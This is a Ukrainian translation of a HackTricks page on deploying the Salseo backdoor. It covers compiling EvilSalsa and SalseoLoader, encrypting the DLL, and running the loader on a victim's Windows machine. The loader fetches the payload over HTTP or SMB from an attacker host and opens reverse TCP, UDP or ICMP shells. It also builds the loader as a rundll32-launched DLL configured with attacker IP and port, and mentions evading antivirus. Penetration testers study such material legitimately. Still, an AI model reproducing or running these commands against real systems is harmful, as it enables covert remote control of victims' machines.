# Salseo

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**

</details>

## Компіляція бінарних файлів

Завантажте вихідний код з GitHub та скомпілюйте **EvilSalsa** та **SalseoLoader**. Вам потрібно мати встановлений **Visual Studio**, щоб скомпілювати код.

Скомпілюйте ці проекти для архітектури віконного ящика, де ви плануєте їх використовувати (якщо Windows підтримує x64, скомпілюйте їх для цієї архітектури).

Ви можете **вибрати архітектуру** всередині Visual Studio в **лівій вкладці "Build"** в **"Platform Target".**

(\*\*Якщо ви не можете знайти ці параметри, натисніть на **"Project Tab"**, а потім на **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Потім скомпілюйте обидва проекти (Build -> Build Solution) (У логах з'явиться шлях до виконавчого файлу):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Підготовка Задніх Дверей

Спочатку вам потрібно закодувати **EvilSalsa.dll.** Для цього ви можете використати скрипт Python **encrypterassembly.py** або скомпілювати проект **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ок, тепер у вас є все необхідне для виконання всієї справи Salseo: **закодований EvilDalsa.dll** та **бінарний файл SalseoLoader.**

**Завантажте бінарний файл SalseoLoader.exe на машину. Їх не повинно виявити жодне Антивірусне програмне забезпечення...**

## **Виконання backdoor**

### **Отримання оберненого оболонкового з'єднання TCP (завантаження закодованого dll через HTTP)**

Не забудьте запустити nc як слухач оберненої оболонки та HTTP-сервер для обслуговування закодованого evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Отримання оберненого оболонки UDP (завантаження закодованого dll через SMB)**

Не забудьте запустити nc як слухач оберненої оболонки та сервер SMB для обслуговування закодованого evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Отримання оберненого shell ICMP (закодований dll вже всередині жертви)**

**На цей раз вам потрібен спеціальний інструмент на клієнті для отримання оберненого shell. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Вимкніть відповіді ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Виконати клієнт:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### У жертви виконайте річ сальсео:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Компіляція SalseoLoader як DLL, експортуючи головну функцію

Відкрийте проект SalseoLoader за допомогою Visual Studio.

### Додайте перед головною функцією: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Встановіть DllExport для цього проекту

#### **Інструменти** --> **Менеджер пакетів NuGet** --> **Керування пакетами NuGet для рішення...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Пошук пакета DllExport (використовуючи вкладку Перегляд) та натисніть Встановити (і підтвердьте спливаюче вікно)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

У папці вашого проекту з'явилися файли: **DllExport.bat** та **DllExport\_Configure.bat**

### **Де**інсталювати DllExport

Натисніть **Деінсталювати** (так, це дивно, але повірте мені, це необхідно)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Вийдіть з Visual Studio та виконайте DllExport\_configure**

Просто **вийдіть** з Visual Studio

Потім перейдіть до вашої папки **SalseoLoader** та **виконайте DllExport\_Configure.bat**

Виберіть **x64** (якщо ви збираєтеся використовувати його в середовищі x64, як у моєму випадку), виберіть **System.Runtime.InteropServices** (в межах **Простору імен для DllExport**) та натисніть **Застосувати**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Відкрийте проект знову за допомогою Visual Studio**

**\[DllExport]** більше не повинен бути позначений як помилка

![](<../.gitbook/assets/image (8) (1).png>)

### Побудуйте рішення

Виберіть **Тип виводу = Бібліотека класів** (Проект --> Властивості SalseoLoader --> Додаток --> Тип виводу = Бібліотека класів)

![](<../.gitbook/assets/image (10) (1).png>)

Виберіть **платформу x64** (Проект --> Властивості SalseoLoader --> Збірка --> Ціль платформи = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Для **побудови** рішення: Build --> Build Solution (У консолі виводу з'явиться шлях до нового DLL)

### Протестуйте згенерований Dll

Скопіюйте та вставте Dll туди, де ви хочете його протестувати.

Виконайте:
```
rundll32.exe SalseoLoader.dll,main
```
Якщо помилка не виникає, ймовірно, у вас є функціональний DLL!!

## Отримати оболонку, використовуючи DLL

Не забудьте використовувати **HTTP** **сервер** та встановити **nc** **слухача**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>
